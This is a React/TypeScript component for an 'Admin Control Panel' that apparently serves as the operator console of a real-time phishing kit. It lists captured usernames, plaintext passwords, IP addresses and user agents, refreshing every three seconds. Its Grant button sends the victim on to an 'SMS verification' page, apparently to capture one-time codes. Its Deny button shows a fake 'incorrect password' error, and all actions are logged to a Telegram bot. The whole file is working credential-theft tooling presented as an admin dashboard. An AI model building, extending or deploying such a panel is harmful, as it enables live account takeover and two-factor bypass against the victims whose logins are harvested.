import { useState } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CheckCircle, XCircle, Loader2, Users, RefreshCw } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { queryClient } from "@/lib/queryClient";

interface PendingRequest {
  id: string;
  username: string;
  password: string;
  timestamp: string;
  ipAddress?: string;
  userAgent?: string;
}

export default function AdminControl() {
  // Fetch pending login requests
  const { data: pendingRequests = [], isLoading, refetch } = useQuery({
    queryKey: ['/api/admin/pending'],
    refetchInterval: 3000, // Refresh every 3 seconds
  });

  const grantMutation = useMutation({
    mutationFn: async (request: PendingRequest) => {
      await apiRequest("POST", "/api/admin/grant", {
        requestId: request.id,
        username: request.username,
        password: request.password,
        action: 'grant'
      });
    },
    onSuccess: () => {
      // Refresh the pending requests list
      queryClient.invalidateQueries({ queryKey: ['/api/admin/pending'] });
    },
  });

  const denyMutation = useMutation({
    mutationFn: async (request: PendingRequest) => {
      await apiRequest("POST", "/api/admin/deny", {
        requestId: request.id,
        username: request.username,
        password: request.password,
        action: 'deny'
      });
    },
    onSuccess: () => {
      // Refresh the pending requests list
      queryClient.invalidateQueries({ queryKey: ['/api/admin/pending'] });
    },
  });

  const handleGrant = (request: PendingRequest) => {
    grantMutation.mutate(request);
  };

  const handleDeny = (request: PendingRequest) => {
    denyMutation.mutate(request);
  };

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-6xl mx-auto">
        <div className="mb-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 flex items-center gap-3">
                <Users className="h-8 w-8 text-blue-600" />
                Admin Control Panel
              </h1>
              <p className="text-gray-600 mt-2">
                Review and approve login attempts in real-time
              </p>
            </div>
            
            <Button
              onClick={() => refetch()}
              disabled={isLoading}
              variant="outline"
              className="flex items-center gap-2"
            >
              <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
              Refresh
            </Button>
          </div>
        </div>

        {/* Statistics */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="p-2 bg-blue-100 rounded-lg">
                  <Users className="h-6 w-6 text-blue-600" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">Pending Requests</p>
                  <p className="text-2xl font-bold text-gray-900">{pendingRequests.length}</p>
                </div>
              </div>
            </CardContent>
          </Card>
          
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="p-2 bg-green-100 rounded-lg">
                  <CheckCircle className="h-6 w-6 text-green-600" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">Auto-Refresh</p>
                  <p className="text-sm font-bold text-green-600">Every 3 seconds</p>
                </div>
              </div>
            </CardContent>
          </Card>
          
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="p-2 bg-orange-100 rounded-lg">
                  <Loader2 className="h-6 w-6 text-orange-600" />
                </div>
                <div className="ml-4">
                  <p className="text-sm font-medium text-gray-600">Status</p>
                  <p className="text-sm font-bold text-orange-600">Monitoring</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Pending Requests */}
        <Card>
          <CardHeader>
            <CardTitle className="text-xl font-bold">Pending Login Requests</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="text-center py-8">
                <Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-600" />
                <p className="mt-2 text-gray-600">Loading requests...</p>
              </div>
            ) : pendingRequests.length === 0 ? (
              <div className="text-center py-8">
                <Users className="mx-auto h-12 w-12 text-gray-400" />
                <p className="mt-2 text-gray-600">No pending requests</p>
                <p className="text-sm text-gray-500">New login attempts will appear here automatically</p>
              </div>
            ) : (
              <div className="space-y-4">
                {pendingRequests.map((request: PendingRequest) => (
                  <div key={request.id} className="border rounded-lg p-4 bg-white">
                    <div className="flex items-center justify-between">
                      <div className="flex-1">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                          <div>
                            <p className="text-sm font-medium text-gray-900">Username</p>
                            <p className="text-sm text-gray-600">{request.username}</p>
                          </div>
                          <div>
                            <p className="text-sm font-medium text-gray-900">Password</p>
                            <p className="text-sm text-gray-600 font-mono">{"*".repeat(Math.min(request.password.length, 8))}</p>
                          </div>
                          <div>
                            <p className="text-sm font-medium text-gray-900">Time</p>
                            <p className="text-sm text-gray-600">
                              {new Date(request.timestamp).toLocaleString()}
                            </p>
                          </div>
                          <div>
                            <p className="text-sm font-medium text-gray-900">IP Address</p>
                            <p className="text-sm text-gray-600">{request.ipAddress || 'Unknown'}</p>
                          </div>
                        </div>
                        
                        {request.userAgent && (
                          <div className="mt-2">
                            <p className="text-sm font-medium text-gray-900">User Agent</p>
                            <p className="text-xs text-gray-500 truncate">{request.userAgent}</p>
                          </div>
                        )}
                      </div>
                      
                      <div className="ml-6 flex gap-3">
                        <Button
                          onClick={() => handleGrant(request)}
                          disabled={grantMutation.isPending || denyMutation.isPending}
                          className="bg-green-600 hover:bg-green-700 text-white flex items-center gap-2"
                          data-testid={`button-grant-${request.id}`}
                        >
                          {grantMutation.isPending ? (
                            <Loader2 className="h-4 w-4 animate-spin" />
                          ) : (
                            <CheckCircle className="h-4 w-4" />
                          )}
                          Grant
                        </Button>
                        
                        <Button
                          onClick={() => handleDeny(request)}
                          disabled={grantMutation.isPending || denyMutation.isPending}
                          variant="destructive"
                          className="flex items-center gap-2"
                          data-testid={`button-deny-${request.id}`}
                        >
                          {denyMutation.isPending ? (
                            <Loader2 className="h-4 w-4 animate-spin" />
                          ) : (
                            <XCircle className="h-4 w-4" />
                          )}
                          Deny
                        </Button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>

        {/* Instructions */}
        <Card className="mt-6">
          <CardContent className="p-6">
            <h3 className="font-semibold text-gray-900 mb-3">Instructions</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-gray-600">
              <div>
                <p><strong className="text-green-600">Grant:</strong> User proceeds to SMS verification page</p>
                <p><strong className="text-red-600">Deny:</strong> User sees "incorrect password" error message</p>
              </div>
              <div>
                <p><strong>Auto-refresh:</strong> Page updates every 3 seconds automatically</p>
                <p><strong>Telegram:</strong> All actions are logged to the configured Telegram bot</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}